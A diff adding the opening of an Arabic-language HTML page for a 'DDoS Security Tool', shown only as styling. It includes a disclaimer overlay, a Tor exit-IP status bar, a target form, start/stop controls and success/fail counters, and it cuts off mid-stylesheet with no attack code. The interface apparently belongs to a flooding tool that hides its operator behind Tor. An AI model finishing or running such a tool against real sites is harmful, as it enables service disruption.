@@ -1,0 +1,2573 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>CyberShield - DDoS Security Tool</title>
+    <style>
+        /* ============================================================
+                   HACKER / CYBERPUNK THEME
+                   Inspired by: Matrix, Mr. Robot, Cyberpunk 2077
+                ============================================================ */
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&family=Cairo:wght@300;400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            /* Core Colors - Dark Hacker Theme */
+            --bg-deep: #050a0f;
+            --bg-primary: #0a0f17;
+            --bg-secondary: #0d1520;
+            --bg-card: rgba(8, 12, 20, 0.95);
+            --bg-glass: rgba(0, 255, 65, 0.03);
+            --bg-input: rgba(0, 255, 65, 0.04);
+
+            /* Terminal Colors - Green on Black */
+            --green-bright: #00ff41;
+            --green-dim: rgba(0, 255, 65, 0.08);
+            --green-glow: rgba(0, 255, 65, 0.15);
+            --green-matrix: #00cc33;
+            --green-dark: #003d1a;
+
+            /* Accent Colors */
+            --cyan: #00d4ff;
+            --cyan-dim: rgba(0, 212, 255, 0.06);
+            --magenta: #ff0066;
+            --magenta-dim: rgba(255, 0, 102, 0.06);
+            --red: #ff0040;
+            --red-dim: rgba(255, 0, 64, 0.08);
+            --orange: #ff8800;
+            --orange-dim: rgba(255, 136, 0, 0.08);
+
+            /* Grayscale - Terminal Style */
+            --text-primary: #00ff41;
+            --text-secondary: rgba(0, 255, 65, 0.75);
+            --text-tertiary: rgba(0, 255, 65, 0.35);
+            --text-muted: rgba(0, 255, 65, 0.12);
+            --border-color: rgba(0, 255, 65, 0.08);
+            --border-glow: rgba(0, 255, 65, 0.10);
+
+            /* Typography */
+            --font-display: 'Orbitron', monospace;
+            --font-terminal: 'Share Tech Mono', monospace;
+            --font-body: 'Cairo', sans-serif;
+
+            /* Spacing */
+            --radius-sm: 4px;
+            --radius-md: 8px;
+            --radius-lg: 12px;
+            --radius-xl: 16px;
+
+            /* Transitions */
+            --transition-fast: 0.12s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-med: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-slow: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background: var(--bg-deep);
+            font-family: var(--font-body);
+            color: var(--text-primary);
+        }
+
+        /* ============================================================
+                   MATRIX RAIN EFFECT (Background)
+                ============================================================ */
+        .matrix-bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+            opacity: 0.06;
+        }
+
+        .matrix-bg canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ============================================================
+                   SCROLLBAR - Terminal Style
+                ============================================================ */
+        ::-webkit-scrollbar {
+            width: 3px;
+            height: 3px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 255, 65, 0.02);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--green-bright);
+            border-radius: 2px;
+            box-shadow: 0 0 10px var(--green-glow);
+        }
+
+        /* ============================================================
+                   DISCLAIMER OVERLAY - Hacker Style
+                ============================================================ */
+        .disclaimer-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: var(--bg-deep);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+
+        .disclaimer-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        /* Scanline overlay on disclaimer */
+        .disclaimer-overlay::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 255, 65, 0.015) 2px,
+                    rgba(0, 255, 65, 0.015) 4px);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .disclaimer-box {
+            max-width: 580px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            background: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 40px 36px 32px;
+            box-shadow:
+                0 0 80px rgba(0, 255, 65, 0.04),
+                inset 0 0 80px rgba(0, 255, 65, 0.02);
+            animation: terminalSlide 0.5s ease;
+            position: relative;
+        }
+
+        .disclaimer-box::before {
+            content: '>';
+            position: absolute;
+            top: 16px;
+            left: 20px;
+            color: var(--text-tertiary);
+            font-family: var(--font-terminal);
+            font-size: 14px;
+        }
+
+        .disclaimer-box::after {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 30%;
+            right: 30%;
+            height: 1px;
+            background: linear-gradient(to right, transparent, var(--green-bright), transparent);
+            opacity: 0.3;
+        }
+
+        @keyframes terminalSlide {
+            from {
+                transform: scale(0.95) translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .disclaimer-icon {
+            text-align: center;
+            font-size: 40px;
+            margin-bottom: 4px;
+            display: block;
+            animation: glitchText 2s infinite;
+        }
+
+        @keyframes glitchText {
+            0%,
+            90%,
+            100% {
+                transform: translate(0);
+            }
+            92% {
+                transform: translate(-2px, 1px);
+            }
+            94% {
+                transform: translate(2px, -1px);
+            }
+            96% {
+                transform: translate(-1px, 2px);
+            }
+            98% {
+                transform: translate(1px, -2px);
+            }
+        }
+
+        .disclaimer-title {
+            font-family: var(--font-display);
+            color: var(--green-bright);
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: 18px;
+            font-weight: 700;
+            text-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
+        }
+
+        .disclaimer-title .cursor-blink {
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .disclaimer-body {
+            color: var(--text-secondary);
+            font-size: 13px;
+            line-height: 2.2;
+            text-align: justify;
+            font-family: var(--font-terminal);
+        }
+
+        .disclaimer-body strong {
+            color: var(--green-bright);
+        }
+        .disclaimer-body .highlight {
+            color: var(--cyan);
+        }
+
+        .disclaimer-divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, var(--border-color), transparent);
+            margin: 14px 0;
+        }
+
+        .disclaimer-footer {
+            display: flex;
+            gap: 14px;
+            margin-top: 22px;
+            flex-wrap: wrap;
+        }
+
+        .disclaimer-footer .btn-disclaimer {
+            flex: 1;
+            min-width: 120px;
+            padding: 14px 24px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all var(--transition-med);
+            font-family: var(--font-terminal);
+            letter-spacing: 1px;
+            background: transparent;
+            color: var(--text-secondary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .disclaimer-footer .btn-disclaimer::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.05), transparent);
+            opacity: 0;
+            transition: var(--transition-fast);
+        }
+
+        .disclaimer-footer .btn-disclaimer:hover::before {
+            opacity: 1;
+        }
+
+        .disclaimer-footer .btn-agree {
+            border-color: var(--green-bright);
+            color: var(--green-bright);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .disclaimer-footer .btn-agree:hover {
+            background: var(--green-dim);
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.12);
+            transform: translateY(-1px);
+        }
+
+        .disclaimer-footer .btn-decline {
+            border-color: rgba(255, 0, 64, 0.3);
+            color: var(--red);
+        }
+
+        .disclaimer-footer .btn-decline:hover {
+            background: var(--red-dim);
+            border-color: var(--red);
+            box-shadow: 0 0 40px rgba(255, 0, 64, 0.05);
+        }
+
+        /* ============================================================
+                   APP CONTAINER
+                ============================================================ */
+        .app-container {
+            display: none;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .app-container.active {
+            display: flex;
+        }
+
+        /* ============================================================
+                   MAIN CARD - Terminal Style
+                ============================================================ */
+        .main-card {
+            width: 100%;
+            max-width: 720px;
+            background: var(--bg-card);
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-color);
+            padding: 24px 22px 20px;
+            box-shadow:
+                0 0 60px rgba(0, 255, 65, 0.02),
+                inset 0 0 60px rgba(0, 255, 65, 0.01);
+            position: relative;
+            overflow: hidden;
+            transition: var(--transition-med);
+        }
+
+        /* Scanline overlay */
+        .main-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 3px,
+                    rgba(0, 255, 65, 0.008) 3px,
+                    rgba(0, 255, 65, 0.008) 4px);
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.5;
+        }
+
+        /* Ambient glow border animation */
+        .main-card::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: var(--radius-md);
+            padding: 1px;
+            background: conic-gradient(from 0deg,
+                    transparent,
+                    rgba(0, 255, 65, 0.03) 20%,
+                    transparent 40%,
+                    rgba(0, 255, 65, 0.03) 60%,
+                    transparent 80%,
+                    transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            z-index: 0;
+            animation: borderRotate 20s linear infinite;
+        }
+
+        @keyframes borderRotate {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .main-card>* {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ============================================================
+                   HEADER - Terminal Style
+                ============================================================ */
+        .app-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .app-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            background: var(--bg-glass);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: var(--font-display);
+            font-size: 18px;
+            font-weight: 900;
+            color: var(--green-bright);
+            flex-shrink: 0;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.05);
+        }
+
+        .brand-icon .cursor-blink {
+            animation: blink 1s step-end infinite;
+        }
+
+        .brand-text {
+            font-family: var(--font-display);
+            font-weight: 700;
+            font-size: 18px;
+            color: var(--text-primary);
+            letter-spacing: 2px;
+            line-height: 1.1;
+        }
+
+        .brand-text span {
+            color: var(--green-bright);
+        }
+
+        .brand-text .cursor-blink {
+            animation: blink 1s step-end infinite;
+        }
+
+        .brand-sub {
+            font-size: 8px;
+            color: var(--text-tertiary);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            display: block;
+            font-weight: 400;
+            font-family: var(--font-terminal);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-security {
+            padding: 6px 16px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            background: var(--bg-glass);
+            color: var(--text-tertiary);
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            font-family: var(--font-terminal);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-security:hover {
+            border-color: var(--green-bright);
+            color: var(--green-bright);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.05);
+        }
+
+        .btn-security .shield-icon {
+            font-size: 12px;
+        }
+
+        /* ============================================================
+                   SYSTEM INFO MODAL - Terminal Style
+                ============================================================ */
+        .sysinfo-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 10, 15, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .sysinfo-overlay.active {
+            display: flex;
+            animation: terminalFade 0.3s ease;
+        }
+
+        @keyframes terminalFade {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .sysinfo-box {
+            max-width: 460px;
+            width: 100%;
+            max-height: 85vh;
+            overflow-y: auto;
+            background: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 28px 26px 24px;
+            box-shadow: 0 0 60px rgba(0, 255, 65, 0.03);
+            animation: terminalSlide 0.35s ease;
+            position: relative;
+        }
+
+        .sysinfo-box::before {
+            content: '>';
+            position: absolute;
+            top: 12px;
+            left: 16px;
+            color: var(--text-tertiary);
+            font-family: var(--font-terminal);
+            font-size: 12px;
+        }
+
+        .sysinfo-box .sysinfo-title {
+            font-family: var(--font-display);
+            color: var(--green-bright);
+            font-size: 14px;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: 18px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .sysinfo-box .sysinfo-title .icon {
+            font-size: 20px;
+        }
+
+        .sysinfo-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.04);
+            font-size: 12px;
+            font-family: var(--font-terminal);
+        }
+
+        .sysinfo-item:last-child {
+            border-bottom: none;
+        }
+
+        .sysinfo-item .label {
+            color: var(--text-tertiary);
+            font-weight: 400;
+        }
+
+        .sysinfo-item .value {
+            color: var(--text-primary);
+            font-weight: 600;
+            text-align: left;
+            word-break: break-all;
+            max-width: 60%;
+            font-size: 11px;
+        }
+
+        .sysinfo-item .value.online {
+            color: var(--green-bright);
+        }
+        .sysinfo-item .value.offline {
+            color: var(--red);
+        }
+        .sysinfo-item .value.warning {
+            color: var(--orange);
+        }
+
+        .sysinfo-close {
+            display: block;
+            width: 100%;
+            margin-top: 16px;
+            padding: 10px;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-tertiary);
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: var(--transition-fast);
+            font-family: var(--font-terminal);
+            letter-spacing: 1px;
+        }
+
+        .sysinfo-close:hover {
+            border-color: var(--green-bright);
+            color: var(--green-bright);
+            background: var(--green-dim);
+        }
+
+        /* ============================================================
+                   TOR STATUS - Terminal Style
+                ============================================================ */
+        .tor-status-bar {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            padding: 10px 14px;
+            background: var(--bg-glass);
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            margin-bottom: 12px;
+            transition: var(--transition-med);
+        }
+
+        .tor-status-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .tor-status-bar .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            transition: var(--transition-med);
+            position: relative;
+        }
+
+        .tor-status-bar .dot.on {
+            background: var(--green-bright);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+
+        .tor-status-bar .dot.on::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 50%;
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            animation: terminalRipple 1.8s ease-out infinite;
+        }
+
+        @keyframes terminalRipple {
+            from {
+                transform: scale(0.8);
+                opacity: 1;
+            }
+            to {
+                transform: scale(1.8);
+                opacity: 0;
+            }
+        }
+
+        .tor-status-bar .dot.off {
+            background: var(--red);
+            box-shadow: 0 0 15px rgba(255, 0, 64, 0.15);
+        }
+
+        .tor-status-bar .dot.checking {
+            background: var(--orange);
+            box-shadow: 0 0 15px rgba(255, 136, 0, 0.15);
+            animation: terminalPulse 1s ease-in-out infinite;
+        }
+
+        @keyframes terminalPulse {
+            0%,
+            100% {
+                opacity: 0.4;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.1);
+            }
+        }
+
+        .tor-status-bar .status-text {
+            font-size: 12px;
+            color: var(--text-secondary);
+            flex: 1;
+            min-width: 60px;
+            font-family: var(--font-terminal);
+        }
+
+        .tor-status-bar .status-text strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .tor-status-bar .status-text .port-badge {
+            font-size: 9px;
+            color: var(--text-tertiary);
+            background: rgba(0, 255, 65, 0.04);
+            padding: 1px 8px;
+            border-radius: 2px;
+            border: 1px solid rgba(0, 255, 65, 0.04);
+            font-family: var(--font-terminal);
+        }
+
+        .tor-status-bar .exit-ip {
+            font-size: 11px;
+            color: var(--green-bright);
+            font-family: var(--font-terminal);
+            background: rgba(0, 255, 65, 0.04);
+            padding: 2px 12px;
+            border-radius: 2px;
+            border: 1px solid rgba(0, 255, 65, 0.04);
+            letter-spacing: 0.5px;
+            font-weight: 500;
+            transition: var(--transition-fast);
+        }
+
+        .tor-status-bar .exit-ip.loading {
+            opacity: 0.4;
+            animation: terminalPulse 1s ease-in-out infinite;
+        }
+
+        .tor-proxy-info {
+            display: flex;
+            gap: 12px;
+            font-size: 9px;
+            color: var(--text-tertiary);
+            font-family: var(--font-terminal);
+            padding-top: 4px;
+            border-top: 1px solid rgba(0, 255, 65, 0.04);
+            flex-wrap: wrap;
+        }
+
+        .tor-proxy-info .proxy-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .tor-proxy-info .proxy-item .badge {
+            background: rgba(0, 255, 65, 0.04);
+            padding: 0px 8px;
+            border-radius: 2px;
+            border: 1px solid rgba(0, 255, 65, 0.04);
+            font-size: 8px;
+            color: var(--text-tertiary);
+        }
+
+        .tor-proxy-info .proxy-item .badge.online {
+            border-color: rgba(0, 255, 65, 0.12);
+            color: var(--green-bright);
+        }
+
+        .tor-proxy-info .proxy-item .badge.offline {
+            border-color: rgba(255, 0, 64, 0.12);
+            color: var(--red);
+        }
+
+        /* ============================================================
+                   STATUS DISPLAY - Terminal Style
+                ============================================================ */
+        .status-display {
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            background: var(--bg-glass);
+            border: 1px solid var(--border-color);
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            transition: all var(--transition-med);
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 500;
+            font-family: var(--font-terminal);
+        }
+
+        .status-display .icon {
+            font-size: 14px;
+            flex-shrink: 0;
+            transition: var(--transition-med);
+        }
+
+        .status-display.idle {
+            border-color: var(--border-color);
+            color: var(--text-tertiary);
+        }
+
+        .status-display.ready {
+            border-color: var(--green-bright);
+            color: var(--green-bright);
+            background: var(--green-dim);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.03);
+        }
+
+        .status-display.active {
+            border-color: var(--green-bright);
+            color: var(--green-bright);
+            background: var(--green-dim);
+            animation: terminalStatusPulse 0.8s infinite alternate;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.04);
+        }
+
+        .status-display.active .icon {
+            animation: terminalIconPulse 0.8s infinite alternate;
+        }
+
+        .status-display.warning {
+            border-color: var(--orange);
+            color: var(--orange);
+            background: var(--orange-dim);
+        }
+
+        .status-display.error {
+            border-color: var(--red);
+            color: var(--red);
+            background: var(--red-dim);
+        }
+
+        @keyframes terminalStatusPulse {
+            from {
+                border-color: var(--green-bright);
+                box-shadow: 0 0 20px rgba(0, 255, 65, 0.02);
+            }
+            to {
+                border-color: rgba(0, 255, 65, 0.2);
+                box-shadow: 0 0 40px rgba(0, 255, 65, 0.05);
+            }
+        }
+
+        @keyframes terminalIconPulse {
+            from {
+                opacity: 0.5;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1.05);
+            }
+        }
+
+        /* ============================================================
+                   FORM - Terminal Style
+                ============================================================ */
+        .form-group {
+            margin-bottom: 10px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 10px;
+            color: var(--text-tertiary);
+            margin-bottom: 3px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 600;
+            font-family: var(--font-terminal);
+        }
+
+        .form-group label .icon {
+            margin-left: 4px;
+            opacity: 0.4;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 13px;
+            transition: all var(--transition-fast);
+            outline: none;
+            font-family: var(--font-terminal);
+        }
+
+        .form-control:focus {
+            border-color: var(--green-bright);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.04);
+            background: rgba(0, 255, 65, 0.02);
+        }
+
+        .form-control::placeholder {
+            color: var(--text-muted);
+        }
+
+        .form-control option {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        /* ============================================================
+                   ADVANCED TOGGLE - Terminal Style
+                ============================================================ */
+        .adv-toggle {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 4px 0 2px;
+            cursor: pointer;
+            color: var(--text-tertiary);
+            font-size: 12px;
+            transition: var(--transition-fast);
+            user-select: none;
+            border: none;
+            background: none;
+            width: 100%;
+            text-align: right;
+            font-family: var(--font-terminal);
+        }
+
+        .adv-toggle:hover {
+            color: var(--text-secondary);
+        }
+
+        .adv-toggle .arrow {
+            transition: var(--transition-med);
+            display: inline-block;
+            font-size: 9px;
+            color: var(--text-muted);
+        }
+
+        .adv-toggle .arrow.open {
+            transform: rotate(90deg);
+            color: var(--green-bright);
+        }
+
+        .adv-section {
+            display: none;
+            padding: 12px 14px;
+            background: rgba(0, 255, 65, 0.02);
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            margin: 4px 0 10px;
+            transition: var(--transition-med);
+        }
+
+        .adv-section.open {
+            display: block;
+            animation: terminalFadeSlide 0.2s ease;
+        }
+
+        @keyframes terminalFadeSlide {
+            from {
+                opacity: 0;
+                transform: translateY(-6px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .adv-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4px 12px;
+        }
+
+        .adv-check {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            padding: 3px 0;
+            transition: var(--transition-fast);
+            font-family: var(--font-terminal);
+        }
+
+        .adv-check:hover {
+            color: var(--text-primary);
+        }
+
+        .adv-check input[type="checkbox"] {
+            width: 14px;
+            height: 14px;
+            accent-color: var(--green-bright);
+            cursor: pointer;
+            flex-shrink: 0;
+            border-radius: 2px;
+        }
+
+        .adv-small-input {
+            padding: 4px 8px !important;
+            font-size: 11px !important;
+            width: 100%;
+        }
+
+        /* ============================================================
+                   BUTTONS - Terminal Style
+                ============================================================ */
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all var(--transition-med);
+            font-family: var(--font-terminal);
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            background: transparent;
+            color: var(--text-secondary);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.04), transparent);
+            opacity: 0;
+            transition: var(--transition-fast);
+        }
+
+        .btn:hover::before {
+            opacity: 1;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn-start {
+            border-color: var(--green-bright);
+            color: var(--green-bright);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.03);
+        }
+
+        .btn-start:hover:not(:disabled) {
+            background: var(--green-dim);
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.08);
+            transform: translateY(-1px);
+        }
+
+        .btn-start:disabled {
+            opacity: 0.15;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .btn-stop {
+            border-color: rgba(255, 0, 64, 0.3);
+            color: var(--red);
+        }
+
+        .btn-stop:hover:not(:disabled) {
+            background: var(--red-dim);
+            border-color: var(--red);
+            box-shadow: 0 0 40px rgba(255, 0, 64, 0.04);
+            transform: translateY(-1px);
+        }
+
+        .btn-stop:disabled {
+            opacity: 0.12;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        .btn .btn-icon {
+            font-size: 14px;
+            line-height: 1;
+        }
+
+        /* ============================================================
+                   STATS - Terminal Style
+                ============================================================ */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-top: 14px;
+        }
+
+        .stat-card {
+            background: var(--bg-glass);
+            border-radius: var(--radius-sm);
+            padding: 10px 4px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            transition: all var(--transition-fast);
+            position: relative;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 20%;
+            right: 20%;
+            height: 1px;
+            background: linear-gradient(to right, transparent, var(--green-bright), transparent);
+            opacity: 0;
+            transition: var(--transition-fast);
+        }
+
+        .stat-card:hover::before {
+            opacity: 0.2;
+        }
+
+        .stat-card:hover {
+            border-color: rgba(0, 255, 65, 0.08);
+            background: rgba(0, 255, 65, 0.01);
+        }
+
+        .stat-number {
+            font-family: var(--font-display);
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary);
+            display: block;
+            line-height: 1.2;
+            transition: var(--transition-fast);
+        }
+
+        .stat-number.total {
+            color: var(--text-primary);
+        }
+        .stat-number.success {
+            color: var(--green-bright);
+        }
+        .stat-number.fail {
+            color: var(--red);
+        }
+        .stat-number.rate {
+            color: var(--cyan);
+        }
+
+        .stat-label {
+            font-size: 8px;
+            color: var(--text-tertiary);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-top: 2px;
+            display: block;
+            font-weight: 600;
+            font-family: var(--font-terminal);
+        }
+
+        /* ============================================================
+                   LOG - Terminal Style
+                ============================================================ */
+        .log-section {
+            margin-top: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .log-header .log-label {
+            font-size: 9px;
+            color: var(--text-tertiary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+            font-family: var(--font-terminal);
+        }
+
+        .log-header .log-actions {
+            display: flex;
+            gap: 6px;
+        }
+
+        .btn-log-clear {
+            background: none;
+            border: none;
+            color: var(--text-tertiary);
+            font-size: 10px;
+            cursor: pointer;
+            transition: var(--transition-fast);
+            font-family: var(--font-terminal);
+            padding: 1px 6px;
+            border-radius: 2px;
+        }
+
+        .btn-log-clear:hover {
+            color: var(--red);
+            background: var(--red-dim);
+        }
+
+        .log-box {
+            padding: 8px 12px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            max-height: 60px;
+            overflow-y: auto;
+            font-size: 10px;
+            color: var(--text-tertiary);
+            font-family: var(--font-terminal);
+            line-height: 1.9;
+            transition: var(--transition-med);
+            min-height: 44px;
+        }
+
+        .log-box .log-entry {
+            border-bottom: 1px solid rgba(0, 255, 65, 0.02);
+            padding: 1px 0;
+            display: flex;
+            gap: 6px;
+        }
+
+        .log-box .log-entry:last-child {
+            border-bottom: none;
+        }
+
+        .log-box .log-entry .log-time {
+            color: var(--text-muted);
+            font-size: 9px;
+            flex-shrink: 0;
+        }
+
+        .log-box .log-entry .log-msg {
+            flex: 1;
+            word-break: break-word;
+        }
+
+        .log-box .log-entry.success .log-msg {
+            color: var(--green-bright);
+        }
+        .log-box .log-entry.error .log-msg {
+            color: var(--red);
+        }
+        .log-box .log-entry.info .log-msg {
+            color: var(--cyan);
+        }
+        .log-box .log-entry.warning .log-msg {
+            color: var(--orange);
+        }
+
+        /* ============================================================
+                   TERMINAL CURSOR BLINK UTILITY
+                ============================================================ */
+        .cursor-blink {
+            animation: blink 1s step-end infinite;
+        }
+
+        /* ============================================================
+                   RESPONSIVE
+                ============================================================ */
+        @media (max-width: 640px) {
+            .main-card {
+                padding: 16px 12px 14px;
+                border-radius: var(--radius-sm);
+            }
+
+            .brand-icon {
+                width: 34px;
+                height: 34px;
+                font-size: 15px;
+            }
+            .brand-text {
+                font-size: 15px;
+                letter-spacing: 1px;
+            }
+            .brand-sub {
+                font-size: 7px;
+                letter-spacing: 2px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 8px;
+            }
+
+            .adv-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 3px 8px;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 6px;
+            }
+
+            .stat-number {
+                font-size: 15px;
+            }
+
+            .btn-group {
+                flex-direction: column;
+                gap: 6px;
+            }
+
+            .btn {
+                padding: 10px;
+                font-size: 13px;
+            }
+
+            .disclaimer-box {
+                padding: 24px 18px 20px;
+            }
+            .disclaimer-body {
+                font-size: 12px;
+                line-height: 1.9;
